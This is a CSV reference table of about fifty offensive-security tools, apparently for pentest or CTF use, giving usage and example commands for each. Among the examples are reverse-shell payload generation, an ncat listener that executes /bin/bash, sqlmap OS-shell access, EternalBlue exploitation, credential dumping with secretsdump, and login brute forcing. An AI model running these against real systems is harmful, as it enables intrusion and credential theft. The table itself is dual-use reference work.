command,category,brief,description,usage,examples
nmap,network,Network exploration and security auditing,Nmap is a powerful network scanner for discovering hosts and services. Supports TCP SYN/Connect/ACK scans, version detection, OS fingerprinting, and NSE scripts.,"nmap [Scan Type(s)] [Options] {target specification}
Options:
  -sS: TCP SYN scan (stealth)
  -sT: TCP Connect scan
  -sV: Version detection
  -sC: Default scripts
  -O: OS detection
  -Pn: Skip host discovery
  -p: Port specification
  -A: Aggressive scan
  --script: Run NSE scripts","nmap -sV 192.168.1.1
nmap -sS -p 1-1000 target.com
nmap -A -T4 192.168.1.0/24
nmap --script vuln target.com"
masscan,network,High-speed internet port scanner,Masscan is the fastest port scanner - can scan the entire internet in under 6 minutes. Uses asynchronous transmission.,"masscan [options] <targets>
Options:
  -p: Port specification
  --rate: Packets per second
  -oL: Output list format
  --banners: Grab banners
  --adapter-ip: Source IP","masscan -p80,443 192.168.1.0/24
masscan -p1-65535 10.0.0.1 --rate=1000
masscan -p80 0.0.0.0/0 --rate=10000000"
netcat,network,TCP/UDP network read/write tool,Netcat (nc) is a versatile networking utility for reading and writing data across network connections. Useful for port scanning, file transfers, and reverse shells.,"nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port
  -e: Execute command
  -u: UDP mode
  -z: Zero-I/O mode (scanning)","nc -lvp 4444
nc target.com 80
nc -z -v target.com 1-1000
echo 'GET /' | nc target.com 80"
nc,network,Netcat alias for network connections,Netcat alias. Same as netcat command.,"nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port","nc -lvp 4444
nc target.com 80"
ncat,network,Nmap's enhanced netcat with SSL,Ncat is Nmap's reimplementation of netcat with SSL support, connection brokering, and proxying features.,"ncat [options] <host> <port>
Options:
  --ssl: Use SSL
  --proxy: Use proxy
  -e: Execute command
  --allow: Allow connections from hosts","ncat --ssl target.com 443
ncat -lvp 4444 -e /bin/bash
ncat --proxy proxy:8080 target.com 80"
curl,network,Transfer data with URLs,Command-line tool for transferring data using various protocols. Essential for web exploitation and API testing.,"curl [options] <URL>
Options:
  -X: Request method
  -d: POST data
  -H: Header
  -b: Cookie
  -o: Output file
  -v: Verbose
  -k: Insecure (skip SSL verify)","curl http://target.com
curl -X POST -d ""user=admin&pass=test"" http://target.com/login
curl -H ""Authorization: Bearer token"" http://target.com/api"
wget,network,Non-interactive network downloader,Downloads files from HTTP, HTTPS, and FTP servers. Supports recursive downloads.,"wget [options] <URL>
Options:
  -O: Output filename
  -r: Recursive download
  -q: Quiet
  --no-check-certificate: Skip SSL verify","wget http://target.com/file.zip
wget -O output.txt http://target.com/data
wget -r http://target.com/directory/"
tcpdump,network,Command-line packet analyzer,Captures and displays network traffic. Essential for network forensics and debugging.,"tcpdump [options]
Options:
  -i: Interface
  -r: Read from file
  -w: Write to file
  -n: Don't resolve names
  -A: ASCII output
  -X: Hex and ASCII","tcpdump -i eth0
tcpdump -r capture.pcap
tcpdump -i eth0 -w output.pcap
tcpdump -r capture.pcap -A | grep -i password"
tshark,network,Terminal Wireshark for protocol analysis,Terminal-based Wireshark. Captures and analyzes network traffic with powerful filtering.,"tshark [options]
Options:
  -i: Interface
  -r: Read file
  -Y: Display filter
  -T: Output format
  -e: Field to print","tshark -r capture.pcap
tshark -r capture.pcap -Y ""http""
tshark -r capture.pcap -Y ""http.request.method==POST"" -T fields -e http.file_data"
amass,network,Subdomain enumeration and network mapping,OWASP Amass performs network mapping by collecting information from various sources including APIs, DNS, and web scraping.,"amass enum [options] -d <domain>
Options:
  -d: Target domain
  -passive: Passive mode only
  -o: Output file
  -brute: Brute force","amass enum -d target.com
amass enum -passive -d target.com
amass enum -brute -d target.com -o subs.txt"
subfinder,network,Fast passive subdomain discovery,Subfinder discovers subdomains using passive online sources. Fast and efficient with multiple source support.,"subfinder [options] -d <domain>
Options:
  -d: Domain
  -dL: Domain list file
  -o: Output file
  -silent: Silent mode
  -all: Use all sources","subfinder -d target.com
subfinder -d target.com -o subs.txt
subfinder -dL domains.txt -o all_subs.txt"
httpx,network,Fast HTTP probing and fingerprinting,Httpx probes for web servers and extracts info like status codes, titles, and technologies. Multi-purpose HTTP toolkit.,"httpx [options]
Options:
  -l: Input list
  -u: Target URL
  -status-code: Show status
  -title: Show title
  -tech-detect: Detect tech
  -content-length: Show length","cat urls.txt | httpx
httpx -l urls.txt -status-code -title
cat subs.txt | httpx -tech-detect"
theharvester,network,Email and domain intelligence gathering,TheHarvester gathers emails, names, subdomains, IPs and URLs from public sources like search engines and PGP servers.,"theHarvester [options] -d <domain>
Options:
  -d: Domain
  -b: Data source (google, bing, etc.)
  -l: Limit results","theHarvester -d target.com -b google
theHarvester -d target.com -b all -l 500"
sqlmap,web,Automatic SQL injection detection/exploitation,SQLmap automates detection and exploitation of SQL injection vulnerabilities. Can enumerate databases, extract data, and get shell access.,"sqlmap [options] -u <URL>
Options:
  -u: Target URL with parameter
  --dbs: Enumerate databases
  -D: Database to enumerate
  --tables: Enumerate tables
  -T: Table to enumerate
  --dump: Dump table data
  --os-shell: Get OS shell
  --batch: Non-interactive mode","sqlmap -u ""http://target.com/page?id=1"" --dbs
sqlmap -u ""http://target.com/page?id=1"" -D mydb --tables
sqlmap -u ""http://target.com/page?id=1"" --os-shell"
nikto,web,Web server vulnerability scanner,Nikto scans web servers for dangerous files, outdated software, and other problems. Checks over 6700 potentially dangerous files.,"nikto -h <host> [options]
Options:
  -h: Target host
  -p: Port
  -ssl: Force SSL
  -o: Output file
  -Display: Show types (1=redirects, 2=cookies, etc.)","nikto -h http://target.com
nikto -h https://target.com -ssl
nikto -h target.com -p 8080 -o scan.txt"
gobuster,web,Directory/file and DNS busting tool,Gobuster brute-forces URIs (directories/files), DNS subdomains, and virtual host names. Fast and flexible.,"gobuster <mode> [options]
Modes: dir, dns, vhost, fuzz
Options:
  -u: Target URL
  -w: Wordlist
  -x: File extensions
  -t: Threads","gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html
gobuster dns -d target.com -w subdomains.txt"
dirb,web,Web content scanner,DIRB scans web servers for existing and hidden web objects using dictionary-based attacks.,"dirb <url> [wordlist] [options]
Options:
  -o: Output file
  -r: Don't search recursively
  -a: User-agent
  -p: Proxy","dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/big.txt
dirb http://target.com -o results.txt"
wfuzz,web,Web fuzzer for brute forcing,WFuzz is a flexible web fuzzer for finding hidden resources, parameters, and vulnerabilities. Uses FUZZ keyword as placeholder.,"wfuzz [options] -z payload,params <url>
Options:
  -w: Wordlist
  -c: Colorize output
  --hc: Hide responses with code
  --hw: Hide by word count
  -d: POST data
  -H: Header","wfuzz -c -w wordlist.txt http://target.com/FUZZ
wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ
wfuzz -c -w wordlist.txt -d ""user=FUZZ&pass=test"" http://target.com/login"
nuclei,web,Template-based vulnerability scanner,Nuclei scans for vulnerabilities using YAML templates. Fast and highly customizable with community templates.,"nuclei [options] -u <url>
Options:
  -u: Target URL
  -l: URL list
  -t: Template path
  -severity: Filter severity
  -tags: Filter by tags","nuclei -u http://target.com
nuclei -l urls.txt -t cves/
nuclei -u target.com -severity critical,high"
ffuf,web,Fast web fuzzer written in Go,Ffuf is a fast web fuzzer. Uses FUZZ keyword as placeholder. Supports multiple wordlists and matchers.,"ffuf [options] -u <url> -w <wordlist>
Options:
  -u: URL with FUZZ
  -w: Wordlist
  -fc: Filter status codes
  -mc: Match codes
  -H: Headers
  -X: HTTP method","ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301"
feroxbuster,web,Fast recursive content discovery,Feroxbuster recursively discovers content using brute force combined with wordlists. Written in Rust for speed.,"feroxbuster [options] -u <url>
Options:
  -u: Target URL
  -w: Wordlist
  -x: Extensions
  -t: Threads
  --burp: Proxy through Burp","feroxbuster -u http://target.com
feroxbuster -u http://target.com -w wordlist.txt -x php,txt"
katana,web,Next-generation web crawler,Katana is a fast crawler that discovers endpoints, files, and parameters. Supports JavaScript crawling.,"katana [options] -u <url>
Options:
  -u: Target URL
  -d: Crawl depth
  -jc: JavaScript crawling
  -jsl: JSLuice parsing","katana -u http://target.com
katana -u http://target.com -d 5 -jc"
dirsearch,web,Web path scanner/brute forcer,Dirsearch brute forces directories and files in web servers with threading and recursion support.,"dirsearch [options] -u <url>
Options:
  -u: Target URL
  -e: Extensions
  -w: Wordlist
  -r: Recursive
  -t: Threads","dirsearch -u http://target.com
dirsearch -u http://target.com -e php,txt,html"
whatweb,web,Web application fingerprinting,WhatWeb identifies websites and recognizes CMS, frameworks, server software, and technologies in use.,"whatweb [options] <url>
Options:
  -v: Verbose
  -a: Aggression level (1-4)
  --log-json: JSON output
  -i: Input file","whatweb http://target.com
whatweb -v http://target.com
whatweb -a 3 http://target.com"
wpscan,web,WordPress security scanner,WPScan scans WordPress sites for vulnerabilities in core, plugins, and themes. Enumerates users and checks passwords.,"wpscan [options] --url <url>
Options:
  --url: Target URL
  --enumerate: Enumerate (u=users, p=plugins, t=themes)
  --api-token: API token
  --passwords: Password list","wpscan --url http://target.com
wpscan --url http://target.com --enumerate u,p
wpscan --url http://target.com --enumerate vp"
commix,web,Command injection testing tool,Commix automates detection and exploitation of command injection vulnerabilities in web applications.,"commix [options] -u <url>
Options:
  -u: Target URL
  --data: POST data
  --os-cmd: Execute command
  -v: Verbosity level","commix -u ""http://target.com/page?id=1""
commix -u ""http://target.com"" --data=""input=test"""
john,password,Fast password cracker,John the Ripper is a fast password cracker supporting many hash types. Supports dictionary, brute force, and rules-based attacks.,"john [options] <password_file>
Options:
  --wordlist: Dictionary file
  --format: Hash format
  --show: Show cracked passwords
  --rules: Enable word mangling
  --incremental: Brute force mode","john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 --wordlist=words.txt hashes.txt
john --show hashes.txt"
hashcat,password,Advanced GPU password recovery,Hashcat is the world's fastest password recovery tool. Supports 300+ hash types and multiple attack modes with GPU acceleration.,"hashcat [options] <hash_file> [wordlist]
Options:
  -m: Hash type (0=MD5, 1000=NTLM, etc.)
  -a: Attack mode (0=dict, 1=combo, 3=brute)
  -o: Output file
  --show: Show cracked
  -r: Rules file","hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt wordlist.txt
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a"
hydra,password,Network login brute forcer,Hydra is a parallelized login cracker supporting numerous protocols including SSH, FTP, HTTP, SMB, RDP, and more.,"hydra [options] <target> <service>
Options:
  -l: Single username
  -L: Username list
  -p: Single password
  -P: Password list
  -t: Threads
  -V: Verbose
  -s: Port","hydra -l admin -P passwords.txt target.com ssh
hydra -L users.txt -P passwords.txt target.com ftp
hydra -l admin -P passwords.txt target.com http-post-form ""/login:user=^USER^&pass=^PASS^:Invalid"""
medusa,password,Parallel modular login brute forcer,Medusa is a speedy, parallel, and modular login brute-forcer supporting many services including SSH, FTP, HTTP, MySQL, and more.,"medusa [options] -h <host> -M <module>
Options:
  -h: Target host
  -H: Host file
  -u: Username
  -U: Username file
  -p: Password
  -P: Password file
  -M: Module (ssh, ftp, http, etc.)
  -t: Threads","medusa -h target.com -u admin -P passwords.txt -M ssh
medusa -h target.com -U users.txt -P passwords.txt -M ftp"
crunch,password,Custom wordlist generator,Crunch generates wordlists based on criteria you specify including character sets, min/max length, and patterns.,"crunch <min> <max> [charset] [options]
Options:
  -o: Output file
  -t: Pattern (@=lower, ,=upper, %=number, ^=symbol)
  -b: Max file size","crunch 8 8 -o wordlist.txt
crunch 6 6 abc123 -o custom.txt
crunch 8 8 -t @@@@%%%% -o pattern.txt"
hashid,password,Hash type identifier,Hashid identifies different types of hashes. Shows corresponding Hashcat mode and John format.,"hashid [options] <hash>
Options:
  -e: Extended (include salted)
  -m: Show hashcat mode
  -j: Show john format","hashid 5d41402abc4b2a76b9719d911017c592
hashid -m 5d41402abc4b2a76b9719d911017c592"
msfconsole,exploitation,Metasploit Framework console,Metasploit is a penetration testing framework with exploits, payloads, and auxiliary modules. Industry standard for exploitation.,"msfconsole [options]
Commands:
  search: Find modules
  use: Select module
  set: Set options
  exploit/run: Execute
  sessions: Manage sessions","msfconsole
msf> search type:exploit platform:windows
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> exploit"
msfvenom,exploitation,Payload generator and encoder,Msfvenom creates payloads for Metasploit and standalone use. Supports encoding and multiple output formats.,"msfvenom [options]
Options:
  -p: Payload
  -f: Format (exe, elf, raw, etc.)
  -o: Output file
  -e: Encoder
  -b: Bad characters
  LHOST/LPORT: Callback address","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe"
searchsploit,exploitation,Exploit database search,Searchsploit searches the Exploit-DB archive for exploits and shellcode. Offline access to exploit database.,"searchsploit [options] <term>
Options:
  -m: Mirror/copy exploit
  -x: Examine exploit
  -p: Show path
  -w: Show URL
  --cve: Search by CVE","searchsploit apache 2.4
searchsploit -m 42966
searchsploit wordpress plugin
searchsploit --cve 2021-44228"
crackmapexec,windows,Post-exploitation tool for networks,CrackMapExec automates pentesting of Windows/AD networks. Supports SMB, WinRM, MSSQL, RDP, LDAP, SSH, and FTP.,"crackmapexec <protocol> <target> [options]
Protocols: smb, winrm, mssql, rdp, ldap, ssh, ftp
Options:
  -u: Username
  -p: Password
  -H: Hash
  -d: Domain","crackmapexec smb 192.168.1.0/24
crackmapexec smb target.com -u admin -p password
crackmapexec smb target.com -u admin -H <hash>"
netexec,windows,Network execution and post-exploitation,NetExec is the successor to CrackMapExec. Multi-protocol post-exploitation tool for Windows networks.,"netexec <protocol> <target> [options]
Protocols: smb, winrm, mssql, vnc, rdp, ldap, wmi, nfs, ssh, ftp
Options:
  -u: Username
  -p: Password
  -H: Hash","netexec smb 192.168.1.0/24
netexec smb target.com -u admin -p password"
evil-winrm,windows,WinRM shell with upload/download,Evil-WinRM provides a shell over WinRM with upload/download features and PowerShell capabilities.,"evil-winrm [options] -i <ip>
Options:
  -i: Target IP
  -u: Username
  -p: Password
  -H: NTLM hash
  -s: Scripts path
  -e: Executables path","evil-winrm -i 192.168.1.100 -u admin -p password
evil-winrm -i 192.168.1.100 -u admin -H <ntlm_hash>"
responder,windows,LLMNR/NBT-NS/MDNS poisoner,Responder poisons LLMNR, NBT-NS, and MDNS requests to capture credentials on local networks.,"responder [options] -I <interface>
Options:
  -I: Interface
  -A: Analyze mode
  -w: WPAD rogue server
  -r: NetBIOS wredir
  -f: Fingerprint hosts","responder -I eth0
responder -I eth0 -wrf
responder -I eth0 -A"
impacket-secretsdump,windows,Extract credentials from targets,Secretsdump extracts credentials from SAM, LSA, NTDS.dit, and cached domain credentials.,"secretsdump.py [options] <target>
Options:
  -sam: SAM file
  -system: SYSTEM file
  -ntds: NTDS.dit file
  -just-dc: DC only
  -history: Include history","impacket-secretsdump domain/user:pass@target
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
impacket-psexec,windows,Remote command execution via SMB,PsExec executes commands remotely using SMB and named pipes. Provides interactive shell.,"psexec.py [options] <target> [command]
Format: domain/user:pass@target
Options:
  -hashes: NTLM hash
  -c: Copy file
  -path: Command path","impacket-psexec domain/admin:password@192.168.1.100
impacket-psexec -hashes :NTLM_HASH domain/admin@target"
impacket-smbclient,windows,SMB client for share access,SMBClient connects to SMB shares for browsing, downloading, and uploading files.,"smbclient.py [options] <target>
Format: domain/user:pass@target
Options:
  -hashes: NTLM hash
  -k: Kerberos auth","impacket-smbclient domain/user:pass@target
impacket-smbclient -hashes :HASH domain/user@target"
bloodhound-python,windows,Active Directory relationship mapper,BloodHound-python collects AD data for attack path analysis. Discovers privilege escalation paths.,"bloodhound-python [options] -d <domain>
Options:
  -d: Domain
  -u: Username
  -p: Password
  -c: Collection method (All, DCOnly, etc.)
  --zip: Compress output","bloodhound-python -d domain.local -u user -p pass -c All
bloodhound-python -d domain.local -u user -p pass -c DCOnly"
smbmap,windows,SMB share enumeration tool,SMBMap enumerates SMB shares and permissions. Can download/upload files and execute commands.,"smbmap [options] -H <host>
Options:
  -H: Host
  -u: Username
  -p: Password
  -d: Domain
  -r: List directory recursively
  --download: Download file","smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -u user -p pass
smbmap -H 192.168.1.100 -r share/"
smbclient,windows,SMB/CIFS client for shares,SMBClient accesses Windows shares from Linux. Standard Samba client.,"smbclient [options] //<host>/<share>
Options:
  -U: Username
  -N: No password
  -L: List shares","smbclient -L //192.168.1.100 -N
smbclient //192.168.1.100/share -U user
smbclient //target/C$ -U 'domain\admin'"
enum4linux,windows,Windows/Samba enumeration,Enum4linux enumerates information from Windows and Samba systems including users, shares, and policies.,"enum4linux [options] <target>
Options:
  -a: All enumeration
  -U: Get users
  -S: Get shares
  -P: Get password policy
  -G: Get groups","enum4linux -a 192.168.1.100
enum4linux -U 192.168.1.100"
binwalk,forensics,Firmware analysis and extraction,Binwalk analyzes, reverse engineers, and extracts firmware images. Identifies embedded files and executable code.,"binwalk [options] <file>
Options:
  -e: Extract files
  -M: Matryoshka (recursive)
  -D: Extract specific type
  -B: Signature scan
  -E: Entropy analysis","binwalk firmware.bin
binwalk -e firmware.bin
binwalk -Me firmware.bin
binwalk -E firmware.bin"
foremost,forensics,File carving and recovery,Foremost recovers files based on headers, footers, and internal data structures. Works on disk images and raw data.,"foremost [options] -i <input> -o <output_dir>
Options:
  -i: Input file
  -o: Output directory
  -t: File types (jpg, png, pdf, etc.)
  -v: Verbose","foremost -i disk.img -o recovered/
foremost -t jpg,png,pdf -i disk.img -o recovered/"
steghide,forensics,Steganography hide/extract tool,Steghide hides and extracts data in image and audio files. Supports JPEG, BMP, WAV, and AU formats.,"steghide <command> [options]
Commands: embed, extract, info
Options:
  -cf: Cover file
  -ef: Embed file
  -sf: Stego file
  -p: Password","steghide info image.jpg
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p password
steghide embed -cf image.jpg -ef secret.txt"
exiftool,forensics,Metadata reader/writer,ExifTool reads, writes and edits metadata in images, audio, video, and documents.,"exiftool [options] <file>
Options:
  -all: All metadata
  -common: Common tags
  -G: Show group names
  -json: JSON output","exiftool image.jpg
exiftool -all image.jpg
exiftool -json *.jpg"
file,forensics,Determine file type,Identifies file type by examining magic bytes and structure. Essential first step in analysis.,"file [options] <file>
Options:
  -b: Brief mode
  -i: MIME type
  -z: Look inside compressed files","file unknown_file
file -b mystery.bin
file -i document.pdf"
xxd,forensics,Hex dump utility,Creates hex dump of a file or reverses it. Useful for examining and modifying binary data.,"xxd [options] <file>
Options:
  -r: Reverse (hex to binary)
  -p: Plain hexdump
  -l: Length
  -s: Start offset
  -c: Columns","xxd file.bin
xxd -p file.bin
xxd -l 100 file.bin
echo '48656c6c6f' | xxd -r -p"
hexdump,forensics,Hex and binary data viewer,Displays file contents in hexadecimal, ASCII, and other formats.,"hexdump [options] <file>
Options:
  -C: Canonical hex+ASCII
  -n: Number of bytes
  -s: Skip bytes","hexdump -C file.bin
hexdump -C -n 100 file.bin"
strings,reversing,Extract printable strings,Extracts printable character sequences from files. Finds hardcoded strings, passwords, and clues.,"strings [options] <file>
Options:
  -a: Scan entire file
  -n: Minimum string length
  -e: Encoding (s=7-bit, l=16-bit LE)
  -t: Print offset","strings binary
strings -n 10 binary
strings binary | grep -i password"
